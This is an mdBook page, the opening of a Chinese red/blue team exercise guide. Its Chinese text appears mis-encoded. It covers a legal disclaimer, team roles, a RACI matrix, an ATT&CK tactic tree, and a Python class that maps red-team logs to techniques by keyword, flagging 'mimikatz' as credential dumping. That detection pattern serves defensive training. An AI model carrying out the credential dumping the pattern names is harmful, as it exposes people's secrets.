<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>çº¢è“å¯¹æŠ—å®Œæ•´å­¦ä¹ æŒ‡å— - å¼€å‘</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="../../highlight.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="../../tomorrow-night.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="../../theme/pagetoc.css">
        <link rel="stylesheet" href="../../theme/help-overlay.css">


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "../../";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
            window.path_to_searchindex_js = "../../searchindex.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>â†</kbd> or <kbd>â†’</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">å¼€å‘</h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="searchbar" name="searchbar" placeholder="æœç´¢æœ¬ä¹¦å†…å®¹..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <i class="fa fa-spinner fa-spin"></i>
                            </div>
                        </div>
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <!-- Page table of contents -->
                        <div class="sidetoc"><nav class="pagetoc"></nav></div>

                        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css">
<h1 id="çº¢è“å¯¹æŠ—å®Œæ•´å­¦ä¹ æŒ‡å—"><a class="header" href="#çº¢è“å¯¹æŠ—å®Œæ•´å­¦ä¹ æŒ‡å—">çº¢è“å¯¹æŠ—å®Œæ•´å­¦ä¹ æŒ‡å—</a></h1>
<h2 id="-å­¦ä¹ è·¯çº¿å›¾"><a class="header" href="#-å­¦ä¹ è·¯çº¿å›¾">ğŸ“‹ å­¦ä¹ è·¯çº¿å›¾</a></h2>
<pre><code>åŸºç¡€ç†è®º(2å‘¨) â†’ çº¢é˜ŸæŠ€æœ¯(6å‘¨) â†’ è“é˜ŸæŠ€æœ¯(6å‘¨) â†’ ç´«é˜ŸååŒ(2å‘¨) â†’ æ¼”ç»ƒå®æˆ˜(4å‘¨) â†’ é«˜çº§å¯¹æŠ—(æŒç»­)
</code></pre>
<h2 id="-æ³•å¾‹å£°æ˜ä¸èŒä¸šé“å¾·"><a class="header" href="#-æ³•å¾‹å£°æ˜ä¸èŒä¸šé“å¾·">âš–ï¸ æ³•å¾‹å£°æ˜ä¸èŒä¸šé“å¾·</a></h2>
<blockquote>
<p><strong>ä¸¥æ­£å£°æ˜</strong>: æ‰€æœ‰çº¢è“å¯¹æŠ—æ´»åŠ¨å¿…é¡»åœ¨åˆæ³•æˆæƒçš„æ¡†æ¶å†…è¿›è¡Œï¼</p>
</blockquote>
<h3 id="åˆæ³•åœºæ™¯"><a class="header" href="#åˆæ³•åœºæ™¯">åˆæ³•åœºæ™¯</a></h3>
<ul>
<li>âœ… ä¼ä¸šæˆæƒçš„æ”»é˜²æ¼”ç»ƒ</li>
<li>âœ… æ­£è§„çš„çº¢è“å¯¹æŠ—ç«èµ›</li>
<li>âœ… å®‰å…¨æµ‹è¯•ä¸è¯„ä¼°é¡¹ç›®</li>
<li>âœ… å†…éƒ¨å®‰å…¨åŸ¹è®­æ¼”ç»ƒ</li>
</ul>
<h3 id="ä¸¥æ ¼ç¦æ­¢"><a class="header" href="#ä¸¥æ ¼ç¦æ­¢">ä¸¥æ ¼ç¦æ­¢</a></h3>
<ul>
<li>âŒ æœªæˆæƒçš„æ”»å‡»æµ‹è¯•</li>
<li>âŒ ç ´åæ€§æ”»å‡»è¡Œä¸º</li>
<li>âŒ æ•°æ®çªƒå–å’Œæ³„éœ²</li>
<li>âŒ å‹’ç´¢å’Œæ•²è¯ˆè¡Œä¸º</li>
</ul>
<hr />
<h2 id="æ¨¡å—ä¸€å¯¹æŠ—åŸºç¡€ä¸ç»„ç»‡å»ºè®¾"><a class="header" href="#æ¨¡å—ä¸€å¯¹æŠ—åŸºç¡€ä¸ç»„ç»‡å»ºè®¾">æ¨¡å—ä¸€ï¼šå¯¹æŠ—åŸºç¡€ä¸ç»„ç»‡å»ºè®¾</a></h2>
<h3 id="æ¨¡å—æ€»è§ˆå®šä½ä¸è¾“å‡º"><a class="header" href="#æ¨¡å—æ€»è§ˆå®šä½ä¸è¾“å‡º">æ¨¡å—æ€»è§ˆï¼ˆå®šä½ä¸è¾“å‡ºï¼‰</a></h3>
<ul>
<li><strong>å­¦ä¹ ç›®æ ‡</strong>ï¼šå»ºç«‹å¯¹çº¢è“å¯¹æŠ—çš„æ•´ä½“è®¤çŸ¥ï¼Œç†è§£ç»„ç»‡æ¶æ„ã€è§’è‰²åˆ†å·¥ã€æµç¨‹è§„èŒƒåŠåˆè§„è¦æ±‚ï¼Œä¸ºåç»­æ¨¡å—å¥ å®šç»Ÿä¸€æ ‡å‡†ã€‚</li>
<li><strong>è¾¾æˆæŒ‡æ ‡</strong>ï¼šèƒ½å¤Ÿè®¾è®¡ä¼ä¸šçº§çº¢è“å¯¹æŠ—è®¡åˆ’ï¼Œç»˜åˆ¶ç»„ç»‡åä½œå…³ç³»å›¾ï¼Œåˆ¶å®šæˆæƒåˆçº¦ä¸å®‰å…¨åŸºçº¿æ¸…å•ï¼Œå®Œæˆä¸€æ¬¡æ¼”ç»ƒå‰è¯„ä¼°ã€‚</li>
<li><strong>å…³é”®äº§å‡º</strong>ï¼š
<ul>
<li>å¯¹æŠ—ç»„ç»‡æ¶æ„å›¾ï¼ˆçº¢/è“/ç™½/ç´«é˜ŸèŒè´£çŸ©é˜µï¼‰</li>
<li>æˆæƒæ–‡æ¡£æ¨¡æ¿ã€é£é™©è¯„ä¼°è¡¨ã€é€šä¿¡æ‰‹å†Œ</li>
<li>å¯¹æŠ—æˆç†Ÿåº¦è‡ªæ£€è¡¨ä¸æ¨è¿›è·¯çº¿å›¾</li>
</ul>
</li>
</ul>
<blockquote>
<p>æ¨èèŠ‚å¥ï¼š</p>
<ul>
<li>ç¬¬1å‘¨ï¼šæ³•å¾‹ä¼¦ç†ã€ç»„ç»‡æ¶æ„ã€è§’è‰²RACIæ¢³ç†ã€‚</li>
<li>ç¬¬2å‘¨ï¼šæ¼”ç»ƒæµç¨‹ã€é£é™©æ§åˆ¶ã€åº¦é‡æŒ‡æ ‡è®¾è®¡ã€‚</li>
<li>ç¬¬3å‘¨ï¼šå®Œæˆæˆæƒæµç¨‹æ¨¡æ‹Ÿã€æˆç†Ÿåº¦è¯„ä¼°ä¸æ”¹è¿›è®¡åˆ’ã€‚</li>
</ul>
</blockquote>
<h4 id="èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹capability-maturity-model"><a class="header" href="#èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹capability-maturity-model">èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹ï¼ˆCapability Maturity Modelï¼‰</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ç­‰çº§</th><th>æè¿°</th><th>å…³é”®ç‰¹å¾</th><th>éœ€è§£å†³çš„é—®é¢˜</th></tr></thead><tbody>
<tr><td>Level 1 åº”æ€¥å‹</td><td>æ— æ­£å¼æµç¨‹ï¼Œä¾é ä¸ªäººç»éªŒ</td><td>ä¸´æ—¶æ‹‰é€šæ²Ÿé€šã€ç¼ºä¹è§„èŒƒ</td><td>æˆæƒæµç¨‹ç¼ºå¤±ã€å½±å“ä¸å¯æ§</td></tr>
<tr><td>Level 2 è®¡åˆ’å‹</td><td>æœ‰åŸºç¡€è®¡åˆ’ä¸æ¸…å•</td><td>å½¢æˆæ¼”ç»ƒè®¡åˆ’ã€æŒ‡å®šè´Ÿè´£äºº</td><td>æµ‹è¯•èŒƒå›´æ¨¡ç³Šã€è¯æ®ç®¡ç†è–„å¼±</td></tr>
<tr><td>Level 3 ä½“ç³»å‹</td><td>å»ºç«‹å…¨æµç¨‹SOPä¸å·¥å…·é“¾</td><td>ç»Ÿä¸€æ¨¡æ¿ã€è‡ªåŠ¨åŒ–è®°å½•ã€å®šæœŸæ¼”ç»ƒ</td><td>æŒ‡æ ‡ä½“ç³»ä¸å®Œå–„ã€ååŒæ•ˆç‡æœ‰å¾…æå‡</td></tr>
<tr><td>Level 4 ä¼˜åŒ–å‹</td><td>æ•°æ®é©±åŠ¨æŒç»­æ”¹è¿›</td><td>å¨èƒæƒ…æŠ¥é©±åŠ¨ã€é˜²å¾¡åŠæ—¶è¿­ä»£</td><td>ç¼ºä¹æ”»é˜²çŸ¥è¯†åº“ä¸ç»éªŒæ²‰æ·€</td></tr>
<tr><td>Level 5 æ™ºèƒ½å‹</td><td>æ”»é˜²ä¸€ä½“åŒ–ã€è‡ªåŠ¨åŒ–å¯¹æŠ—</td><td>AIOpsè¾…åŠ©æ£€æµ‹ã€ç´«é˜Ÿå¸¸æ€åŒ–</td><td>éœ€è¦è·¨éƒ¨é—¨å®‰å…¨æ²»ç†ä¸ç”Ÿæ€åˆä½œ</td></tr>
</tbody></table>
</div>
<h4 id="å‰ç½®è‡ªæ£€before-action-checklist"><a class="header" href="#å‰ç½®è‡ªæ£€before-action-checklist">å‰ç½®è‡ªæ£€ï¼ˆBefore-Action Checklistï¼‰</a></h4>
<ul>
<li><input disabled="" type="checkbox"/>
æ˜¯å¦æ‹¥æœ‰ç»è¿‡æ³•åŠ¡å®¡æ ¸çš„æˆæƒä¹¦ã€è´£ä»»è±å…ä¹¦ï¼Ÿ</li>
<li><input disabled="" type="checkbox"/>
æ˜¯å¦å»ºç«‹çº¢/è“/ç™½/ç´«é˜Ÿè”ç³»äººæ¸…å•åŠ24å°æ—¶é€šä¿¡æœºåˆ¶ï¼Ÿ</li>
<li><input disabled="" type="checkbox"/>
æ˜¯å¦ç¡®è®¤æ¼”ç»ƒç¯å¢ƒéš”ç¦»ç­–ç•¥ã€å›æ»šæœºåˆ¶ã€èµ„æºä¿éšœè®¡åˆ’ï¼Ÿ</li>
<li><input disabled="" type="checkbox"/>
æ˜¯å¦å®Œæˆå…³é”®èµ„äº§ã€ä¸šåŠ¡ã€ä¾›åº”é“¾çš„ä¼˜å…ˆçº§æ’åºï¼Ÿ</li>
<li><input disabled="" type="checkbox"/>
æ˜¯å¦åˆ¶å®šæ¼”ç»ƒä¸­æ–­ä¸åº”æ€¥å‡çº§æµç¨‹ï¼Ÿ</li>
</ul>
<h3 id="11-æ ¸å¿ƒæ¦‚å¿µ"><a class="header" href="#11-æ ¸å¿ƒæ¦‚å¿µ">1.1 æ ¸å¿ƒæ¦‚å¿µ</a></h3>
<h4 id="çº¢è“å¯¹æŠ—å®šä¹‰"><a class="header" href="#çº¢è“å¯¹æŠ—å®šä¹‰">çº¢è“å¯¹æŠ—å®šä¹‰</a></h4>
<p><strong>çº¢è“å¯¹æŠ—</strong>æ˜¯ä¸€ç§æ¨¡æ‹ŸçœŸå®æ”»å‡»åœºæ™¯çš„ç½‘ç»œå®‰å…¨æ¼”ç»ƒæ–¹å¼ï¼Œé€šè¿‡çº¢é˜Ÿï¼ˆæ”»å‡»æ–¹ï¼‰ã€è“é˜Ÿï¼ˆé˜²å®ˆæ–¹ï¼‰ã€ç™½é˜Ÿï¼ˆè£åˆ¤æ–¹ï¼‰ä¸‰æ–¹å¯¹æŠ—ï¼Œå…¨é¢æ£€éªŒä¼ä¸šå®‰å…¨é˜²æŠ¤èƒ½åŠ›ã€‚</p>
<p><strong>æ ¸å¿ƒä»·å€¼</strong>:</p>
<pre><code>1. æ£€éªŒé˜²å¾¡ä½“ç³»æœ‰æ•ˆæ€§
2. å‘ç°å®‰å…¨ç›²ç‚¹å’Œå¼±ç‚¹
3. æå‡å®‰å…¨å›¢é˜Ÿå®æˆ˜èƒ½åŠ›
4. å®Œå–„åº”æ€¥å“åº”æµç¨‹
5. å»ºç«‹å®‰å…¨æ–‡åŒ–æ„è¯†
</code></pre>
<h4 id="å›¢é˜Ÿè§’è‰²å®šä½"><a class="header" href="#å›¢é˜Ÿè§’è‰²å®šä½">å›¢é˜Ÿè§’è‰²å®šä½</a></h4>
<p><strong>çº¢é˜Ÿï¼ˆRed Teamï¼‰</strong>:</p>
<pre><code>èŒè´£:
- æ¨¡æ‹ŸçœŸå®æ”»å‡»è€…è¡Œä¸º
- çªç ´é˜²å¾¡ä½“ç³»
- çªƒå–æ•æ„Ÿæ•°æ®
- å»ºç«‹æŒä¹…åŒ–æ§åˆ¶

ç›®æ ‡:
- å‘ç°å®‰å…¨å¼±ç‚¹
- æµ‹è¯•æ£€æµ‹èƒ½åŠ›
- è¯„ä¼°å“åº”æ•ˆç‡
</code></pre>
<p><strong>è“é˜Ÿï¼ˆBlue Teamï¼‰</strong>:</p>
<pre><code>èŒè´£:
- ç›‘æ§ç½‘ç»œæµé‡
- æ£€æµ‹å¼‚å¸¸è¡Œä¸º
- å“åº”å®‰å…¨äº‹ä»¶
- åŠ å›ºé˜²å¾¡ä½“ç³»

ç›®æ ‡:
- åŠæ—¶å‘ç°æ”»å‡»
- å¿«é€Ÿå“åº”å¤„ç½®
- æœ€å°åŒ–å½±å“
- æŒç»­æ”¹è¿›é˜²å¾¡
</code></pre>
<p><strong>ç™½é˜Ÿï¼ˆWhite Teamï¼‰</strong>:</p>
<pre><code>èŒè´£:
- åˆ¶å®šæ¼”ç»ƒè§„åˆ™
- ç›‘ç£æ¼”ç»ƒè¿‡ç¨‹
- è¯„ä¼°æ”»é˜²æ•ˆæœ
- åè°ƒåŒæ–¹å†²çª

ç›®æ ‡:
- ç¡®ä¿æ¼”ç»ƒå®‰å…¨
- å…¬æ­£è¯„åˆ¤ç»“æœ
- æ€»ç»“ç»éªŒæ•™è®­
</code></pre>
<p><strong>ç´«é˜Ÿï¼ˆPurple Teamï¼‰</strong>:</p>
<pre><code>èŒè´£:
- åè°ƒçº¢è“åŒæ–¹
- å…±äº«æ”»å‡»æŠ€æœ¯
- ä¼˜åŒ–é˜²å¾¡ç­–ç•¥
- çŸ¥è¯†ä¼ é€’åŸ¹è®­

ç›®æ ‡:
- æå‡æ•´ä½“å®‰å…¨èƒ½åŠ›
- ä¿ƒè¿›åä½œæ²Ÿé€š
- æŒç»­å®‰å…¨æ”¹è¿›
</code></pre>
<h4 id="è§’è‰²èŒè´£çŸ©é˜µraci"><a class="header" href="#è§’è‰²èŒè´£çŸ©é˜µraci">è§’è‰²èŒè´£çŸ©é˜µï¼ˆRACIï¼‰</a></h4>
<div class="table-wrapper"><table><thead><tr><th>å·¥ä½œåŒ…</th><th>çº¢é˜Ÿ</th><th>è“é˜Ÿ</th><th>ç™½é˜Ÿ</th><th>ç´«é˜Ÿ</th></tr></thead><tbody>
<tr><td>æ¼”ç»ƒèŒƒå›´åˆ¶å®š</td><td>A</td><td>C</td><td>R</td><td>I</td></tr>
<tr><td>æˆæƒä¸åˆè§„è¯„å®¡</td><td>C</td><td>C</td><td>A/R</td><td>I</td></tr>
<tr><td>ä¾¦å¯Ÿä¸æ”»å‡»æ‰§è¡Œ</td><td>R</td><td>I</td><td>C</td><td>A</td></tr>
<tr><td>æ£€æµ‹ä¸å“åº”</td><td>I</td><td>A/R</td><td>C</td><td>C</td></tr>
<tr><td>å½“æ—¥å¤ç›˜ä¼šè®®</td><td>R</td><td>R</td><td>A</td><td>C</td></tr>
<tr><td>æ¼”ç»ƒæŠ¥å‘Šäº¤ä»˜</td><td>C</td><td>C</td><td>A/R</td><td>R</td></tr>
<tr><td>çŸ¥è¯†åº“æ›´æ–°</td><td>C</td><td>C</td><td>I</td><td>A</td></tr>
</tbody></table>
</div>
<blockquote>
<p><strong>è¯´æ˜</strong>ï¼šA=Accountableï¼ˆæœ€ç»ˆè´Ÿè´£ï¼‰ï¼ŒR=Responsibleï¼ˆæ‰§è¡Œï¼‰ï¼ŒC=Consultedï¼ˆå’¨è¯¢ï¼‰ï¼ŒI=Informedï¼ˆçŸ¥æƒ…ï¼‰ã€‚</p>
</blockquote>
<h4 id="å¯¹æŠ—æ²Ÿé€šæ‰‹å†Œcommunication-runbook"><a class="header" href="#å¯¹æŠ—æ²Ÿé€šæ‰‹å†Œcommunication-runbook">å¯¹æŠ—æ²Ÿé€šæ‰‹å†Œï¼ˆCommunication Runbookï¼‰</a></h4>
<ul>
<li><strong>æ—¥å¸¸åŒæ­¥</strong>ï¼šæ¯æ—¥å›ºå®šæ—¶é—´å¬å¼€â€œæ”»é˜²ä¾‹ä¼šâ€ï¼Œçº¢é˜Ÿæ±‡æŠ¥æ”»å‡»è¿›å±•ï¼Œè“é˜Ÿåˆ†äº«æ£€æµ‹å“åº”ï¼Œç™½é˜Ÿè®°å½•è¡ŒåŠ¨é¡¹ã€‚</li>
<li><strong>é‡å¤§å‘Šè­¦</strong>ï¼šè‹¥å‡ºç°ä¸šåŠ¡å½±å“æˆ–æ•æ„Ÿèµ„äº§è®¿é—®ï¼Œéœ€åœ¨5åˆ†é’Ÿå†…é€šè¿‡åº”æ€¥ç¾¤ï¼ˆIM+ç”µè¯ï¼‰é€šçŸ¥æ‰€æœ‰è´£ä»»äººï¼Œå¹¶åŒæ­¥æ‰§è¡Œåœæ­¢æ¡ä»¶è¯„ä¼°ã€‚</li>
<li><strong>è¯æ®æäº¤æµç¨‹</strong>ï¼šçº¢é˜Ÿä¸Šä¼ æ”»å‡»è¯æ®è‡³åŠ å¯†å­˜å‚¨ï¼ˆåªè¯»æƒé™ï¼‰ï¼Œè“é˜ŸåŒæ­¥æ£€æµ‹æ—¥å¿—ï¼Œç™½é˜Ÿç‰µå¤´ç¼–å·ã€æ ‡è®°æ•æ„Ÿçº§åˆ«å¹¶å®šæœŸå¤‡ä»½ã€‚</li>
<li><strong>å½±å“è¯„ä¼°æµç¨‹</strong>ï¼šç™½é˜Ÿç‰µå¤´ç»„ç»‡ä¸šåŠ¡è´Ÿè´£äººã€ITã€çº¢è“ä»£è¡¨å¬å¼€å¿«é€Ÿè¯„ä¼°ä¼šï¼Œç¡®å®šæ˜¯å¦è¿›å…¥åº”æ€¥æ¨¡å¼æˆ–è°ƒæ•´èŒƒå›´ã€‚</li>
<li><strong>ä¿å¯†çº¦å®š</strong>ï¼šæ¼”ç»ƒç»†èŠ‚ä»…é™æˆæƒèŒƒå›´äººå‘˜çŸ¥æ™“ï¼Œå¿…è¦æ—¶ç­¾ç½²NDAï¼Œç™½é˜Ÿè´Ÿè´£å®¡è®¡è®¿é—®æ—¥å¿—å’Œèµ„æ–™é”€æ¯è®¡åˆ’ã€‚</li>
</ul>
<h3 id="12-æ”»é˜²æ¼”ç»ƒå‚è€ƒæ¡†æ¶"><a class="header" href="#12-æ”»é˜²æ¼”ç»ƒå‚è€ƒæ¡†æ¶">1.2 æ”»é˜²æ¼”ç»ƒå‚è€ƒæ¡†æ¶</a></h3>
<h4 id="mitre-attckæ¡†æ¶"><a class="header" href="#mitre-attckæ¡†æ¶">MITRE ATT&amp;CKæ¡†æ¶</a></h4>
<p><strong>æˆ˜æœ¯çŸ©é˜µï¼ˆ14ä¸ªæˆ˜æœ¯é˜¶æ®µï¼‰</strong>:</p>
<pre><code>åˆå§‹è®¿é—® (Initial Access)
â”œâ”€â”€ é’“é±¼æ”»å‡»
â”œâ”€â”€ ä¾›åº”é“¾æ”»å‡»
â”œâ”€â”€ å¤–éƒ¨æœåŠ¡åˆ©ç”¨
â””â”€â”€ æœ‰æ•ˆè´¦æˆ·

æ‰§è¡Œ (Execution)
â”œâ”€â”€ å‘½ä»¤å’Œè„šæœ¬è§£é‡Šå™¨
â”œâ”€â”€ ç”¨æˆ·æ‰§è¡Œ
â”œâ”€â”€ è®¡åˆ’ä»»åŠ¡
â””â”€â”€ ç³»ç»ŸæœåŠ¡

æŒä¹…åŒ– (Persistence)
â”œâ”€â”€ è´¦æˆ·æ“çºµ
â”œâ”€â”€ å¯åŠ¨æ–‡ä»¶å¤¹
â”œâ”€â”€ è®¡åˆ’ä»»åŠ¡
â””â”€â”€ æœåŠ¡åˆ›å»º

æƒé™æå‡ (Privilege Escalation)
â”œâ”€â”€ è¿›ç¨‹æ³¨å…¥
â”œâ”€â”€ è®¿é—®ä»¤ç‰Œæ“çºµ
â”œâ”€â”€ æå‡æƒé™
â””â”€â”€ æ»¥ç”¨ç‰¹æƒ

é˜²å¾¡è§„é¿ (Defense Evasion)
â”œâ”€â”€ æ··æ·†æ–‡ä»¶/ä¿¡æ¯
â”œâ”€â”€ å¸è½½å®‰å…¨è½¯ä»¶
â”œâ”€â”€ è¿›ç¨‹éšè—
â””â”€â”€ è™šæ‹ŸåŒ–æ£€æµ‹è§„é¿

å‡­è¯è®¿é—® (Credential Access)
â”œâ”€â”€ å‡­è¯è½¬å‚¨
â”œâ”€â”€ æš´åŠ›ç ´è§£
â”œâ”€â”€ é”®ç›˜è®°å½•
â””â”€â”€ ç½‘ç»œå—…æ¢

å‘ç° (Discovery)
â”œâ”€â”€ ç³»ç»Ÿä¿¡æ¯å‘ç°
â”œâ”€â”€ ç½‘ç»œé…ç½®å‘ç°
â”œâ”€â”€ è´¦æˆ·å‘ç°
â””â”€â”€ è¿œç¨‹ç³»ç»Ÿå‘ç°

æ¨ªå‘ç§»åŠ¨ (Lateral Movement)
â”œâ”€â”€ è¿œç¨‹æœåŠ¡
â”œâ”€â”€ å†…éƒ¨é’“é±¼
â”œâ”€â”€ å…±äº«èµ„æºåˆ©ç”¨
â””â”€â”€ Windowsè¿œç¨‹ç®¡ç†

æ”¶é›† (Collection)
â”œâ”€â”€ æ•°æ®æ”¶é›†
â”œâ”€â”€ å±å¹•æˆªå›¾
â”œâ”€â”€ éŸ³é¢‘æ•è·
â””â”€â”€ å‰ªè´´æ¿æ•°æ®

å‘½ä»¤ä¸æ§åˆ¶ (Command and Control)
â”œâ”€â”€ åº”ç”¨å±‚åè®®
â”œâ”€â”€ åŠ å¯†é€šé“
â”œâ”€â”€ éæ ‡å‡†ç«¯å£
â””â”€â”€ åŸŸåç”Ÿæˆç®—æ³•

æ¸—å‡º (Exfiltration)
â”œâ”€â”€ é€šè¿‡C2é€šé“
â”œâ”€â”€ é€šè¿‡æ›¿ä»£åè®®
â”œâ”€â”€ æ•°æ®å‹ç¼©
â””â”€â”€ è‡ªåŠ¨åŒ–æ¸—å‡º

å½±å“ (Impact)
â”œâ”€â”€ æ•°æ®åŠ å¯†
â”œâ”€â”€ æ•°æ®ç ´å
â”œâ”€â”€ æœåŠ¡åœæ­¢
â””â”€â”€ èµ„æºåŠ«æŒ
</code></pre>
<p><strong>å®æˆ˜åº”ç”¨</strong>:</p>
<pre><code class="language-python"># ATT&amp;CKæŠ€æœ¯æ˜ å°„è„šæœ¬
class ATTACKMapping:
    def __init__(self):
        self.techniques = {
            'T1566': {  # Phishing
                'tactic': 'Initial Access',
                'name': 'é’“é±¼æ”»å‡»',
                'detection': [
                    'é‚®ä»¶ç½‘å…³ç›‘æ§',
                    'ç”¨æˆ·è¡Œä¸ºåˆ†æ',
                    'é™„ä»¶æ²™ç®±æ£€æµ‹'
                ],
                'mitigation': [
                    'å®‰å…¨æ„è¯†åŸ¹è®­',
                    'DMARCé…ç½®',
                    'é‚®ä»¶è¿‡æ»¤è§„åˆ™'
                ]
            },
            'T1003': {  # OS Credential Dumping
                'tactic': 'Credential Access',
                'name': 'å‡­è¯è½¬å‚¨',
                'detection': [
                    'LSASSè¿›ç¨‹ç›‘æ§',
                    'æ³¨å†Œè¡¨ç›‘æ§',
                    'å¼‚å¸¸å·¥å…·æ£€æµ‹'
                ],
                'mitigation': [
                    'LSAä¿æŠ¤',
                    'Credential Guard',
                    'æœ€å°æƒé™åŸåˆ™'
                ]
            }
        }

    def map_red_team_action(self, action_log):
        """
        å°†çº¢é˜Ÿè¡ŒåŠ¨æ˜ å°„åˆ°ATT&amp;CKæŠ€æœ¯
        """
        mapped_techniques = []
        for action in action_log:
            if 'mimikatz' in action.lower():
                mapped_techniques.append('T1003')
            elif 'phish' in action.lower():
                mapped_techniques.append('T1566')
        return mapped_techniques

    def generate_blue_team_playbook(self, techniques):
        """
        ç”Ÿæˆè“é˜Ÿåº”å¯¹æ‰‹å†Œ
        """
        playbook = []
        for tech_id in techniques:
            if tech_id in self.techniques:
                tech = self.techniques[tech_id]
                playbook.append({
                    'technique': tech['name'],
                    'detection_methods': tech['detection'],
                    'mitigation_steps': tech['mitigation']
                })
        return playbook
</code></pre>
<hr />
